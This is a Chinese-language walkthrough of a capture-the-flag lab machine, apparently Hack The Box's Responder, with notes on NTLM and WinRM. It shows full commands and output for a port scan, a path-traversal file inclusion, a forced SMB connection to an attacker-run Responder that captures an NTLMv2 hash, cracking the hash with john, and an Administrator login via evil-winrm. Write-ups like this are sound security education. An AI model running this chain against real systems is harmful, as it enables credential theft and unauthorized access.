### 一、操作流程

1. 使用`nmap`扫描主机

> nmap -p- --min-rate 5000 -sV 10.129.193.25
> -p- 全端口扫描 -sV 扫描具体版本 --min-rate 5000 指定Nmap每秒钟发送的数据包数量最小是多少

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-05 13:53 CST
Nmap scan report for 10.129.67.89
Host is up (1.0s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.00 seconds

```

> 存在80端口和5985端口及操作系统为win

2. 发现漏洞

> 访问`http://10.129.67.89/`，会跳转到`http://unika.htb/index.php?page=french.html`，因此我们发现`page=french.html`可能存在文件包含漏洞

- 更改参数值为`page=../../../../../../../../windows/system32/drivers/etc/hosts`，可以读取文件内存
- 更改参数值为`page=http://www.bing.com`，不能正常访问

> 结论：存在本地包含漏洞，但是远程包含漏洞不能使用，即`http`和`ftp`协议无法加载，但是可以使用`smb`协议

3. 利用漏洞

> 利用 NTLM (New Technology Lan Manager)的特性获取用户的密码hash

- 启动`Responer`工具，并监听网络接口，如`./Responder.py -I tun0`

> 工具下载:`git clone https://github.com/lgandx/Responder`

- 更改访问参数值为`page=//10.10.16.3/somefile`,并进行访问，得到使用hash加密的密码

> `Responder`执行时会伪造`10.10.16.3`为smb服务器，并进行验证，从而获得密码

```shell
SMB] NTLMv2-SSP Client   : 10.129.67.89
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:3abb9a0b592ced17:96E482EEA77CB1D830A6EEE82882768F:0101000000000000006CA46022F1D801592D17719C5EB8A2000000000200080056004A003500560001001E00570049004E002D00570036004E00330045003500490043004E005800310004003400570049004E002D00570036004E00330045003500490043004E00580031002E0056004A00350056002E004C004F00430041004C000300140056004A00350056002E004C004F00430041004C000500140056004A00350056002E004C004F00430041004C0007000800006CA46022F1D80106000400020000000800300030000000000000000100000000200000036CB995AFCDB4A55CCA0FBF9D2C16241E3981CD4BB1F815BEBCC0BBA82861200A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

- 使用hash破解工具`john`对hash进行破解

> john -w=/usr/share/wordlists/rockyou.txt hash.txt
> hash.txt存储hash值
>
```shell
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2022-11-05 14:36) 3.125g/s 12800p/s 12800c/s 12800C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

1. 获取flag.txt
使用密码和用户访问服务器即可

> evil-winrm -i 10.129.67.89 -u administrator -p badminton

### 涉及知识点

1. 远程包含漏洞，可以保护的协议有`http`、`ftp`及`smb`，当服务器设置`allow_url_include`和`allow_url_fopen`为`Off`时，`smb`依旧可以使用
2. Responder工具使用
3. NTLM (New Technology Lan Manager) 原理及认证流程

- NTLM工作原理：
  - 用户在客户端输入密码和用户名，把密码转换为散列值(hash),并把用户名上传到服务器
  - 服务器接收用户名并返回随机数Challenge（挑战）给客户端
  - 客户端使用散列值(hash)加密Challenge（挑战），并把值Response（应答）返回服务器
  - 服务器把随机数Challenge（挑战）、Response（应答）及用户名传递给域控安全管理器
  - 域控安全管理器提取用户的密码并使用Challenge（挑战）加密，如果跟Response（应答）比较，一致则为正确

4. WinRM:win的远程交互服务，使用端口为5985
